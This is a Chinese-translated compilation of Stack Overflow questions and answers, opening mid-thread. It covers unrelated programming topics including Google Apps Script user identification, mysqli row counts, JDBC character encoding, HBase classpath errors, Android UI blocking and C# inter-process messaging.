> 时间：2016-10-30T13:24:05.300

好消息：这个解决方法是可能的！

我正在使用一些保护功能来显示文档的用户和所有者，并将其存储在属性中以获得更好的性能。玩得开心！

```
function onEdit(e) {
  SpreadsheetApp.getUi().alert("User Email is " + getUserEmail());
}

function getUserEmail() {
  var userEmail = PropertiesService.getUserProperties().getProperty("userEmail");
  if(!userEmail) {
    var protection = SpreadsheetApp.getActive().getRange("A1").protect();
    // tric: the owner and user can not be removed
    protection.removeEditors(protection.getEditors());
    var editors = protection.getEditors();
    if(editors.length === 2) {
      var owner = SpreadsheetApp.getActive().getOwner();
      editors.splice(editors.indexOf(owner),1); // remove owner, take the user
    }
    userEmail = editors[0];
    protection.remove();
    // saving for better performance next run
    PropertiesService.getUserProperties().setProperty("userEmail",userEmail);
  }
  return userEmail;
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-09-06T16:13:52.743

我想您将这段代码设置为在`onEdit`函数（或编辑触发器）内执行。

如果您使用的是消费者帐户，`Session.getActiveUser().getEmail()`则将返回空白。只有当脚本的作者和用户都在同一个 Google Apps 域中时，它才会返回电子邮件地址。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-04-01T14:06:25.960

当我使用从触发器运行的脚本时，我遇到了 Wim den Herder 的解决方案。任何非脚本所有者都无法编辑受保护的单元格。如果脚本是从按钮运行的，它工作得很好。但是我需要定期运行脚本，所以这是我的解决方案：

当用户第一次使用工作表时，他/她应该单击一个按钮并运行：

```
function identifyUser(){
   var input = Browser.inputBox('Enter User Id which will be used to save user to events (run once)');
  PropertiesService.getUserProperties().setProperty("ID", input);
} 
```

这会将用户的输入保存到用户属性中。以后可以随时使用以下代码读回它：

var user = PropertiesService.getUserProperties().getProperty("ID");

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-01-13T16:16:47.607

在此代码中，您可以使用单元格进行输入。不需要授权脚本。

```
function onEdit(e){
  checkUsername(e);
}

function checkUsername(e){
  var sheet = e.source.getActiveSheet();
  var sheetToCheck = 'Your profile';
  var sheetName = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(sheetToCheck);
  var CellInputUsername = 'B4';
  var ActiveCell = SpreadsheetApp.getActive().getActiveRange().getA1Notation();

  if (sheet.getName() !== sheetToCheck || ActiveCell !== CellInputUsername){return;}

  var cellInput = sheetName.getRange(CellInputUsername).getValue();
  PropertiesService.getUserProperties().setProperty("Name", cellInput);

  // Make cell empty again for new user
  sheetName.getRange(CellInputUsername).setValue("");

  var Username = PropertiesService.getUserProperties().getProperty("Name");      
  SpreadsheetApp.getUi().alert("Hello " + Username);
} 
```

# php - php error_log() 没有将所有错误写入指定文件

> ID：12300784
> 
> 赞同：1
> 
> 时间：2012-09-06T13:04:37.450
> 
> 标签：php, logging

我正在使用 error_log() 将错误/日志写入应用程序中的特定文件。我见过一些日志中的条目丢失的情况。当我们使用 error_log() 函数进行过多的日志记录时，这是一个已知问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:21:49.630

1.  打开 php.ini
2.  找到`error log`.

如果您希望将错误记录在同一目录中，那么，

```
error_log = error_log 
```

否则，如果您希望将其存储到单个文件中，

```
error_log = /path/to/errorlog 
```

# iphone - Obj-C，如何处理 4 个部分的版本号？，大于等

> ID：12300794
> 
> 赞同：1
> 
> 时间：2012-09-06T13:05:32.953
> 
> 标签：iphone, objective-c, ios, xcode

我知道这不会是一项具有挑战性的练习，但我想我会问一下，以防万一 Objective-c 等中已经有一些方法。

在我的应用程序中，我只处理 2 号版本号，例如 1.5

我想将此升级为 4 个数字，最多可以有 4 个数字。

因此，当传递数据库版本和捆绑版本号时，我需要处理现有数字并返回 true 或 false。

目前我只是做

```
NSString *strOnePointFive = @"1.5";
if (dblDBVersion < [strOnePointFive doubleValue]) {

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:16:16.717

这是[重复](https://stackoverflow.com/questions/3339722/check-iphone-ios-version)的，是其他格式的。以下是有关如何处理版本号的一些答案，无论是等于、大于还是低于所需的版本号。这是此链接中的答案..

```
NSString *reqSysVer = @"3.1";
NSString *currSysVer = [[UIDevice currentDevice] systemVersion];
if ([currSysVer compare:reqSysVer options:NSNumericSearch] != NSOrderedAscending)
    isSupported = YES;
else
    isSupported = NO; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:14:26.633

我所做的是把那个字符串分解成组件：

```
NSArray *array = [myVersion componentsSeparatedByCharactersInSet:@"."];

NSInteger value = 0;
NSInteger multiplier = 1000000;
for(NSString *n in array) {
  value += [n integerValue] * multiplier;
  multiplier /= 100;
} 
```

这样做是为您提供一个可用于比较的标准化值，并且通常会比较具有不同“深度”的版本，即 1.5 和 1.5.2。

如果您有超过 100 个点发布（即任何数字大于 100），它就会中断，并且还会声明 1.5.0 == 1.5。也就是说，它简短、甜美且易于使用。

编辑：如果您使用 NSString 'compare:options:' 方法，请确保您的字符串修饰得很好：

```
 s1 = @"1.";
    s2 = @"1";
    NSLog(@"Compare %@ to %@ result %d", s1, s2, (int)[s1 compare:s2 options:NSNumericSearch]);
    s1 = @"20.20.0";
    s2 = @"20.20";
    NSLog(@"Compare %@ to %@ result %d", s1, s2, (int)[s1 compare:s2 options:NSNumericSearch]);

2012-09-06 11:26:24.793 xxx[59804:f803] Compare 1\. to 1 result 1
2012-09-06 11:26:24.794 xxx[59804:f803] Compare 20.20.0 to 20.20 result 1 
```

# android - Android：如何在进度条处于活动状态时禁用控件

> ID：12300796
> 
> 赞同：14
> 
> 时间：2012-09-06T13:05:38.417
> 
> 标签：android, android-layout, android-view, android-progressbar

我“像往常一样”在操作栏中显示我的无限进度条：

```
requestWindowFeature(Window.FEATURE_INDETERMINATE_PROGRESS);
...
setProgressBarIndeterminateVisibility(true);
...
setProgressBarIndeterminateVisibility(false); 
```

真正的工作是在后台线程（AsyncTask）中完成的

问题：UI上的所有控件都已启用，因此用户可以在长时间的过程完成之前继续修改底层数据。

简单地禁用所有控件是不可能的，因为禁用 EditText 时，Android 也会自动关闭键盘。

任何想法如何在后台工作期间防止用户输入？

谢谢，

克里斯

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2014-09-01T08:20:48.763

您可以做的是调出一个不可见的对话框并防止它被取消。它将显示其下方的任何内容，但会禁用所有底层用户交互。然后，一旦您完成了您的业务，您只需将其解雇并继续您的生活：

```
Dialog mOverlayDialog = new Dialog(mContext, android.R.style.Theme_Panel); //display an invisible overlay dialog to prevent user interaction and pressing back
mOverlayDialog.setCancelable(false);
mOverlayDialog.show(); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-06T13:11:15.633

试着把`progressDialog.setcancelable(false);`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-06T13:15:02.717

您正在尝试仅设置 Activity 的属性。而是使用 ProgressDialog 调出一个对话框，这样 Ui 将无法访问

```
ProgressDialog dialog = ProgressDialog.show(this, "", "Please wait...", true); 
```

编辑：如果您不想使用 ProgressDialog，请获取根布局并调用

```
layout.setEnabled(false) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-10-01T21:28:14.007

万一，如果其他人面临同样的问题，

禁用编辑文本使用：`EditText.setFocusable(false);`

启用编辑：`EditText.setFocusableInTouchMode(true);`

# java - java打印索引卡

> ID：12300802
> 
> 赞同：2
> 
> 时间：2012-09-06T13:05:50.800
> 
> 标签：java, printing

我正在开发这个Java 应用程序，我正在尝试在索引卡上打印单独的带标题的故事板，即每张卡一个图像。

我曾设想我可以通过在标准 4" x 6" 索引卡上以横向模式打印来做到这一点，但我的打印机，这是一台相当新的 HP Photosmart 5515，无法应付它。

卡片只能纵向装入打印机，否则说固定架太短。当您选择纵向模式时，它可以打印，但它有点违反直觉，并且它浪费了故事板图像上方和下方的空间，而故事板图像只占用了可用空间的三分之一。

当您告诉机器以横向模式打印时，它仍然以纵向模式打印，但边距设置完全荒谬。

```
protected void setPageFormat(PrinterJob job) {

    PageFormat defaultPageFormat = job.defaultPage();
    Paper paper = defaultPageFormat.getPaper();
    paper.setImageableArea(0.0D, 0.0D, paper.getWidth(), paper.getHeight());

    defaultPageFormat.setPaper(paper);

    // sets imageable size to maximum allowable margins
    pageFormat = job.validatePage(defaultPageFormat);
} 
```

我使用 PrinterJob 方法**validatePage**来确保边距正常，并且正是这个例程返回了微​​小的边距设置。

当我使用 A4 纸而不是索引卡时，页边距完全没问题。当我选择横向索引卡并查看 pageFormat 对象时，它告诉我它是纵向的，即使我选择了横向，即使给出的宽度比高度长。

任何建议，不胜感激

# jquery - 在这种情况下如何防止单元格表数据换行？

> ID：12300805
> 
> 赞同：0
> 
> 时间：2012-09-06T13:05:59.787
> 
> 标签：jquery, html, html-table

在这个捕获的图像中：

![在此处输入图像描述](../Images/09c3478ce2efdcd00e38850dd5c50acf.png)

该页面的代码是：

```
<div align="center">
<table cellpadding='1' cellspacing='1' width='98%' class="formulaire">
    <tr>
        <td width="5%"><img style="cursor:pointer"  id="img_rech"  width="16px" border="0" title="<?php echo _getText('main.recherche') ?>"  src="<?php echo HTTP_ICONES ?>ic_zoom.png" onclick="afficherRech()"></td>
        <td width="75%" class="normaltext" align="center">
            <input type="hidden" id="nb_total" value="<?php echo $data['event']['cnt']; ?>" />
            <span id="nb_enreg"></span><span id="total_enreg"><?php echo $data['event']['cnt'] . " " . _getText('main.accueil.evenement'); ?></span>
        </td>
        <td class="normaltext" width="10%" align="right"><span id="labelFiltre"><?php echo _getText('main.accueil.onglet.evenement.filtre'); ?></span></td>
        <td width="10%" align="right">
        <select id="filtreList" name="filtreList" onchange="filtrerList(this.value)" class="selectnormalCourt">
            <option value="-1"><?php echo _getText('main.accueil.onglet.evenement.filtre.tous'); ?></option>
            <option value="05">5</option>
            <option value="10">10</option>
            <option value="20">20</option>
            <option value="25">25</option>
            <option value="50">50</option>
        </select>
        </td>
    </tr>
</table>
</div> 
```

列表框事件的 JQuery 是：

```
<script language="javascript">
    function filtrerList(nb_rows)
    {
        var nb_total = $('#nb_total').val();
        var num = new Number(nb_rows); // pour ne pas afficher le "0" avant le chiffre ( 05 )
        nb_total = new Number(nb_total);
        if (num != -1)
        {
            if (nb_rows > nb_total)
            {
                $('#nb_enreg').html(nb_total + ' sur ');
            }
            else
            {
                $('#nb_enreg').html(num + ' sur ');
            }
        }
        else
        {
            $('#nb_enreg').html('');
        }

        var html = $.ajax({
            data: "nb_rows="+nb_rows+"&mp="+<?php echo $_SESSION[MANUEL]; ?> ,
            type: "POST",
            url:  "<?php echo HTTP_AJAX_REF ?>ReferentielFiltrerListEventsAjax.php",
            async: false
         }).responseText;
        $('#list').html(html);
    }
</script> 
```

如何删除我用红色圈起来的换行符？

这里是 CSS ：

```
.formulaire {
    border: 0px solid;
    border-color:#b80500;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
}

.normaltext{
    width:150px;
    font-family: Verdana, Helvetica, sans-serif;
    font-size:11px;
    font-weight:bold;
    color:#000;
}

.formulaire .selectnormalCourt {
    width: 63px;
    background-color:#FFFF; 
    border:1px solid;
    border-color:#b80500;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
    border: 1px solid #bbb;
    color: #000;
    background-position: 10px 6px;
    float: right;
}

.formulaire .selectnormalCourt:focus {
    outline: none;
    border: 1px solid #699DE3;
    -webkit-box-shadow: inset 0 2px 2px #ccc, 0 0 10px #ADDCE6;
    -moz-box-shadow: inset 0 2px 2px #ccc, 0 0 10px #ADDCE6;
    box-shadow: inset 0 2px 2px #ccc, 0 0 10px #ADDCE6;
    color: #666666;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:13:19.343

从发布的代码中不清楚文本是如何生成的，但您应该简单地确定哪个元素将包含文本“5 sur 13 événements”或类似的内容，并`white-space: nowrap`在 CSS 中对其进行设置。如果这破坏了布局，请重新设计布局以适应文本。

# silverlight - 在silverlight中设置控件相对于屏幕分辨率的宽度

> ID：12300808
> 
> 赞同：1
> 
> 时间：2012-09-06T13:06:14.250
> 
> 标签：silverlight, xaml

我无法设置相对于屏幕分辨率的边框控制大小。

我想将边框的宽度指定为屏幕分辨率的 80% [仅限宽度]。但我无法这样做。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T14:17:45.727

最简单的方法是将边框放在网格中：

```
<Grid x:Name="LayoutRoot"
        Background="White">
    <Grid.ColumnDefinitions>
        <!--80% column-->
        <ColumnDefinition Width="8*"></ColumnDefinition>
        <!--20% column-->
        <ColumnDefinition Width="2*"></ColumnDefinition>
    </Grid.ColumnDefinitions>

    <Border Grid.Column="0"
            Background="Red"></Border>
    <Border Grid.Column="1"
            Background="Yellow"></Border>
</Grid> 
```

编辑：
对不起，我刚刚意识到我没有正确阅读你的问题。你说的是屏幕分辨率。我的示例将网格的第一列设置为浏览器窗口大小的 80%。如果它是您想要的屏幕分辨率，我认为您将不得不使用 javascript 来获取值，然后使用代码将您的对象设置为正确的大小：

```
var width= HtmlPage.Window.Eval("screen.availWidth");
var height= HtmlPage.Window.Eval("screen.availHeight"); 
```

# php - mysqli 如果结果 > 0 做某事

> ID：12300810
> 
> 赞同：0
> 
> 时间：2012-09-06T13:06:20.880
> 
> 标签：php, mysqli

我将如何使用 mysqli 执行此操作？

```
$SQL = mysql_query("SELECT username FROM users WHERE username = '$new_username'");
$result = mysql_num_rows($SQL);

If(!$result > 0) {
echo... 
```

我试过：

```
$SQL = $mysqli->query("SELECT username FROM users WHERE username = '$utilizator");
$rezultat->num_rows($SQL);` 
```

但我没有得到任何结果。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:07:52.520

您已使用 .. 开始查询，`$SQL`因为对象将位于该变量中：

```
$SQL = $mysqli->query("SELECT username FROM users WHERE username = '$utilizator'");
$num = $SQL->num_rows();

if($num){
    // run your code here
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T13:12:08.057

您必须在执行后调用 store_result() 。

php.net 有一个很棒的 php 文档：[http ://www.php.net/manual/de/mysqli-stmt.num-rows.php](http://www.php.net/manual/de/mysqli-stmt.num-rows.php)

例如：

```
$query = "SELECT Name, CountryCode FROM City ORDER BY Name LIMIT 20";
if ($stmt = $mysqli->prepare($query)) {
  /* execute query */
  $stmt->execute();

  /* store result */
  $stmt->store_result();

  printf("Number of rows: %d.\n", $stmt->num_rows);

  /* close statement */
  $stmt->close();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T13:10:04.990

```
$number_of_rows = $SQL->num_rows; 
```

# java - 如何更改 JDBC 编码以支持法语重音字符

> ID：12300813
> 
> 赞同：1
> 
> 时间：2012-09-06T13:06:34.733
> 
> 标签：java, mysql, jdbc, encoding, character-encoding

我在使用**JDBC** (mysql-connector-java-5.1.18-bin.jar)从**Mysql 5.1**获取数据时遇到问题。

 **我的插入语句是这样的：

```
 INSERT INTO Categories  VALUES ('01','Matières premières'); 
```

**Netbeans**终端和 Swing 接口的输出如下所示：

```
 MatiŠres premiŠres 
```

我认为我需要指定编码参数。

你能帮忙吗？

ps：操作系统是Windows 7 French。

这是我在类连接中到数据库的 url：

```
 DriverManager.getConnection("jdbc:mysql://X.X.X.X:XXXX/XXXX?useUnicode=yes&characterEncoding=UTF-8","XXXX","XXXX"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:16:51.317

两种解决方案：

*   最理智的一个：将您的表设置为用作排序规则“utf8-general-ci”并将mysql设置为使用相同的排序规则进行连接。所以你不会有任何问题，也不需要在使用 jdbc 连接时指定任何内容。

*   另一个，现在几乎不能接受但可能：确定表的排序规则并使用它在 JDBC 中配置连接，如下所述：http: [//dev.mysql.com/doc/refman/5.0/en/connector-j -reference-charsets.html](http://dev.mysql.com/doc/refman/5.0/en/connector-j-reference-charsets.html)。但是您**必须**知道表格的编码是什么（因为您不知道，如果您在法国，它可能是 Latin1）。

要确定或更改表的编码，您可以使用任何 mysql 管理工具。确保表格和连接保持一致。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-12T12:46:06.910

您必须使用 System.setProperty("file.encoding", "ISO-8859-1") 将编码设置为 ISO-8859-1**

# hadoop - 运行 HbaseMapreduce 程序时出现 ClassNotFound 异常

> ID：12300814
> 
> 赞同：0
> 
> 时间：2012-09-06T13:06:37.877
> 
> 标签：hadoop, mapreduce, hbase

我是 Hbase 的新手，我正在尝试一些示例示例以将数据从文件加载到 Htable。我从 Eclipse 创建了一个 jar 并将该 jar 和输入文件存储在 HDFS 目录中并开始运行该 jar：

```
hadoop jar $HADOOP_HOME/CSV2HBASE.jar /home/hbaseuser/input.csv csv_table 
```

然后我遇到了异常

```
Warning: $HADOOP_HOME is deprecated.

Exception in thread "main" java.lang.NoClassDefFoundError: org/apache/hadoop/hbase/HBaseConfiguration
        at com.stratapps.hbase.CSV2HBase.main(CSV2HBase.java:67)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:601)
        at org.apache.hadoop.util.RunJar.main(RunJar.java:156)
Caused by: java.lang.ClassNotFoundException: org.apache.hadoop.hbase.HBaseConfiguration
        at java.net.URLClassLoader$1.run(URLClassLoader.java:366)
        at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:423)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
        ... 6 more 
```

我的输入文件是：

```
row1    f1  cl1 0.12
row2    f1  cl1 0.35
row3    f1  cl1 1.58
row4    f1  cl1 2.73
row5    f1  cl1 0.93 
```

和类：

```
import java.io.IOException;
import org.apache.hadoop.conf.Configuration;
import org.apache.hadoop.fs.Path;
import org.apache.hadoop.hbase.HBaseConfiguration;
import org.apache.hadoop.hbase.client.Put;
import org.apache.hadoop.hbase.io.ImmutableBytesWritable;
import org.apache.hadoop.hbase.mapreduce.TableMapReduceUtil;
import org.apache.hadoop.hbase.util.Bytes;
import org.apache.hadoop.io.LongWritable;
import org.apache.hadoop.io.Text;
import org.apache.hadoop.mapreduce.Job;
import org.apache.hadoop.mapreduce.Mapper;
import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;
import org.apache.hadoop.mapreduce.lib.input.SequenceFileInputFormat;
import org.apache.hadoop.mapreduce.lib.input.TextInputFormat;
import org.apache.hadoop.util.GenericOptionsParser;
public class CSV2HBase {

  private static final String NAME = "CSV2HBase";

  static class Uploader extends Mapper<LongWritable, Text, ImmutableBytesWritable, Put> {

    @Override
    public void map(LongWritable key, Text line, Context context)throws IOException 
    {

      String [] values = line.toString().split(",");
      if(values.length != 4) {
    System.out.println("err values.length!=4 len:"+values.length);
    System.out.println("input string is:"+line);
        return;
      }
      // Extract each value
      byte [] row = Bytes.toBytes(values[0]);
      byte [] family = Bytes.toBytes(values[1]);
      byte [] qualifier = Bytes.toBytes(values[2]);
      byte [] value = Bytes.toBytes(values[3]);
      Put put = new Put(row);
      put.add(family, qualifier, value);

      try {
        context.write(new ImmutableBytesWritable(row), put);
      } catch (InterruptedException e) {
        e.printStackTrace();
      }

    }
  }
  public static Job configureJob(Configuration conf, String [] args)
  throws IOException {
    Path inputPath = new Path(args[0]);
    String tableName = args[1];
    Job job = new Job(conf, NAME + "_" + tableName);
    job.setJarByClass(Uploader.class);
    FileInputFormat.setInputPaths(job, inputPath);
    job.setInputFormatClass(TextInputFormat.class);
    job.setMapperClass(Uploader.class);

    TableMapReduceUtil.initTableReducerJob(tableName, null, job);
    job.setNumReduceTasks(0);
    return job;
  }

  public static void main(String[] args) throws Exception {
    Configuration conf = HBaseConfiguration.create();
    conf.set("hbase.zookeeper.quorum","172.16.17.55");
    conf.set("hbase.zookeeper.property.clientPort","2181");
     String[] otherArgs = new GenericOptionsParser(conf, args).getRemainingArgs();
    if(otherArgs.length != 2) {
      System.err.println("Wrong number of arguments: " + otherArgs.length);
      System.err.println("Usage: " + NAME + " <input> <tablename>");
      System.exit(-1);
    }
    Job job = configureJob(conf, otherArgs);
    System.exit(job.waitForCompletion(true) ? 0 : 1);
  }
} 
```

请任何人解决我面临的问题。我什至将 jar 文件保存在 ${HADOOP_HOME} 中，但我仍然遇到 classnotfound 异常

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T14:02:45.213

您必须将这些类添加到 CLASSPATH 中，或者在导出时使用 Eclipse 将它们打包到 JAR 中。

# asp.net - 在运行时获取会话变量

> ID：12300815
> 
> 赞同：1
> 
> 时间：2012-09-06T13:06:40.477
> 
> 标签：asp.net, session, variables

IIS服务器（win2003下）自己的虚拟目录中有更多的web应用程序（asp.net 4）。并且属于 oracle 11g 数据库中所有自己的架构和帐户。登录后，所有用户都有一些会话变量（如用户名、shema 名称...等）。我想在运行时获取这些信息用于用户管理。我如何从服务器询问它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:17:45.673

也许你正在寻找这个？

要检索：

```
string username = Session["Username"]; 
```

把东西放在 Session 上：

```
Session["Username"]="SomeValue"; 
```

# soap - Wso2 ESB 获取代理名称

> ID：12300816
> 
> 赞同：1
> 
> 时间：2012-09-06T13:06:42.050
> 
> 标签：soap, wso2, wso2esb, esb, orchestration

我想知道如何按顺序获取正在使用的代理的名称：

```
<proxy xmlns="http://ws.apache.org/ns/synapse" name="PROXYNAME" transports="https,http" statistics="disable" trace="disable" startOnLoad="true">
   <target>
      <inSequence>
         <property> *GET-NAME OF THIS PROXY...* </property>
      </inSequence>
   </target>
   <publishWSDL uri="http://localhost/Test2/Service.asmx?wsdl" />
</proxy> 
```

**编辑** 为了获得代理的名称（它应该包含在标题'To'中，我正在尝试将其作为代理的inSequence：

```
<sequence xmlns="http://ws.apache.org/ns/synapse" name="testsequence">
   <property xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:ns="http://org.apache.synapse/xsd" xmlns:ns3="http://org.apache.synapse/xsd" name="p1" expression="$header/wsa:To" scope="default" />
   <log level="custom">
      <property xmlns:ns="http://org.apache.synapse/xsd" xmlns:ns3="http://org.apache.synapse/xsd" name="***output" expression="get-property('p1')" />
   </log>
</sequence> 
```

不起作用，请问有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-10T13:42:54.927

用一个非常简单的方法解决：get-property('To')

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-07-22T17:01:08.353

这将返回代理名称。

```
<log level="custom"> <property name="ProxyName" expression="$ctx:proxy.name"/></log> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T08:47:58.340

努维奥，

我只是想知道这样做的真正要求是什么，因为特定代理服务的名称保持静态，而特定代理服务完全由服务提供服务。但是，如果您真的想这样做，更简单的方法是在序列的开头有一个静态属性（使用属性中介）并为其分配代理名称。或者你可以通过使用表达式“$header/wsa:To”来提取“To”标头的值，其中“wsa”对应于相关的寻址命名空间，然后编写一个正则表达式来提取服务名称。

干杯，普拉巴斯

# java - JFace WizardSelectionPage 和 IWizardNode

> ID：12300821
> 
> 赞同：2
> 
> 时间：2012-09-06T13:07:06.590
> 
> 标签：java, dialog, jface, wizard

如何使用 WizardSelectionPage 和 IWizardNode 组合 JFace 向导？

有没有人试过这个？我在互联网上没有找到任何示例。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-18T14:00:19.837

这是一个示例[http://www.mikero.nl/java/how-to-use-wizardselectionpage/](http://www.mikero.nl/java/how-to-use-wizardselectionpage/)。

它展示了如何创建一个`WizardSelectionPage`显示包含列表的查看器`IWizardNodes`。当一个项目被选中时，被选中的节点被传递给`setSelectedNode' which initialises the nested wizard. Pressing`Next` 打开嵌套向导的第一页。

# c# - C# 在同一台电脑内发送消息/命令

> ID：12300825
> 
> 赞同：0
> 
> 时间：2012-09-06T13:07:17.273
> 
> 标签：c#

我有一个系统托盘应用程序（C#、Windows 窗体）。在这个可执行文件旁边，我将有另外 x 个可执行文件（用 C# 编写），它们必须以某种方式向系统托盘应用程序发送一条消息（最好是字符串格式）。

*   我不想为此安装整个 Windows 服务。
*   它不是客户端-服务器。这一切都发生在同一台PC上。使用与套接字结合的监听器会很麻烦，我认为它甚至可能被它自己的防火墙阻止。
*   我正在寻找类似于控制台应用程序的东西，它可以处理其主要功能的参数。仅这一次用于已经运行的 Windows 窗体应用程序。
*   是否有可能以某种方式在系统托盘应用程序中创建一个可由其他可执行文件调用的全局函数/过程？像“global void PerformAction(params here){..}”？这似乎是最好的解决方案，但我不确定 .NET 4 是否支持这一点。

示例：可执行 X1.exe 向系统托盘应用程序发送消息“执行操作 [A] 参数 [B]”，然后自行终止。然后系统托盘应用程序将读取该字符串，然后知道它需要使用参数“B”调用函数 A。

但是我如何发送/接收消息？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:57:30.447

对于本地通信，您可以尝试匿名管道。

链接：http: [//msdn.microsoft.com/en-us/library/bb546102.aspx](http://msdn.microsoft.com/en-us/library/bb546102.aspx)

您还可以查看远程方法调用。这是一个例子：

[http://www.codeproject.com/Articles/14791/NET-Remoting-with-an-easy-example](http://www.codeproject.com/Articles/14791/NET-Remoting-with-an-easy-example)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:33:56.987

[不求助于 WCF - 您可以在命名管道](http://en.wikipedia.org/wiki/Named_pipe)上使用简单的包装器- 就像我发布的[这个](https://stackoverflow.com/a/10434708/802203)作为另一个问题的答案一样。

希望这可以帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T17:01:18.557

正如史蒂夫 B 提到的，对我来说最简单的解决方案似乎是使用 WCF 服务（在托盘应用程序内）。我使用了本教程：[http](http://www.switchonthecode.com/tutorials/wcf-tutorial-basic-interprocess-communication) ://www.switchonthecode.com/tutorials/wcf-tutorial-basic-interprocess-communication 。

我以前没有听说过管道，但我认为上面的链接使用了带有管道的 WCF 服务。它确实解决了我的问题。

感谢您提供的许多解决方案（而且速度如此之快）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-06T13:35:34.637

本机应用程序有一个非常方便的方法，即窗口消息。通过一些 hack，您还可以将它与您的 .net 应用程序一起使用。

我建议你参考

SendMessage 和 SendMessageA api 函数。不过，您可能必须编写一些不安全的代码。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-06T13:46:40.627

如果您使用自托管的 Asp.Net Web API，那么您可以使用对该应用程序的简单 http 调用来执行方法。这很好，因为您可以使用 fiddler 或任何可以发送 http 请求的东西对其进行测试。

这是一个示例的链接。 [http://www.asp.net/web-api/overview/hosting-aspnet-web-api/self-host-a-web-api](http://www.asp.net/web-api/overview/hosting-aspnet-web-api/self-host-a-web-api)

# c# - OleDbConnection 在任何打开的 Excel 窗口中以只读方式打开工作表

> ID：12300827
> 
> 赞同：2
> 
> 时间：2012-09-06T13:07:26.090
> 
> 标签：c#, .net, excel, oledb

这是非常确切的问题： [OleDbConnection() 在任何打开的 Excel 窗口中打开一个 Excel 文件。但如果没有打开窗口](https://stackoverflow.com/questions/8229929/oledbconnection-opens-an-excel-file-in-any-open-excel-window-but-does-not-if)，则不会，但它没有答案。

如果我打开了多个 Excel 窗口，我的程序将在任何 Excel 窗口中打开一个只读工作表。即，如果我打开了 Test.xlsx，并且在另一个窗口中有一张空白表（假设我的程序想要写入 Test.xlsx）；当我做：

`OleDbConnection myConn = new OleDbConnection(conn);`

`myConn.Open();`

Test.xlsx 的只读副本将在空白窗口中打开，程序将对其进行操作。有没有办法确保`myConn`使用已经打开的Test.xlsx？

如果有帮助，我的`conn`变量是：

"提供者=Microsoft.Jet.OLEDB.4.0；数据源=C:\temp\Test.xlsx；扩展属性="Excel 8.0；HDR=No""

# objective-c - NSTimer 和重叠圈数

> ID：12300830
> 
> 赞同：0
> 
> 时间：2012-09-06T13:07:32.813
> 
> 标签：objective-c, cocoa

我有一个作为秒表基础的 NSTimer。

```
- (void)startTimer
{
    _startDate = [NSDate date];
    _timer = [NSTimer scheduledTimerWithTimeInterval:1.0/10.0
                                              target:self 
                                            selector:@selector(updateTimer) 
                                            userInfo:nil 
                                             repeats:YES];
} 
```

我需要记录单圈时间，但我遇到了两个单独的单圈时间不应共享任何重叠的问题。

即如果第 1 圈从 0.0 开始并在 10.0 结束，那么第 2 圈应该从 10.01 开始但是在有圈的那一刻，我只取当前时间，计算上一圈的结束和新的开始一：

```
- (void)lap
{
    NSTimeInterval timeInterval = [[NSDate date] timeIntervalSinceDate:_startDate];
    timeInterval += _timeElapsed;

    _startDate = [NSDate date];
} 
```

我需要保存每圈的开始/结束时间以及它们的总长度。但是如果不同圈的开始/结束时间相同，我看不出如何做到这一点。

有没有人遇到过这个问题？任何想法我可以如何明智地解决它。我想到的一切都感觉很脆弱。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T14:06:16.537

如果它是一个真正的单圈计时器，据我所知，那么你假设两个单独的圈应该有一个差距是不准确的。具体来说，声明：

> 即如果第 1 圈从 0.0 开始并在 10.0 结束，那么第 2 圈应该从 10.01 开始

对于我对单圈计时器的理解是不正确的。第二圈立即开始，因为 lap2 的开始与 lap1 的停止相同。否则，您将在这些差距上浪费时间。

我建议只节省每个单独的时间。因此，如果您跑了 5 圈，则应该有大小时间（如果您总是从零开始，则为 5）。您现在有了每圈开始和结束的时间标记。

```
0.00
10.03
20.04
30.09
40.20
50.33 
```

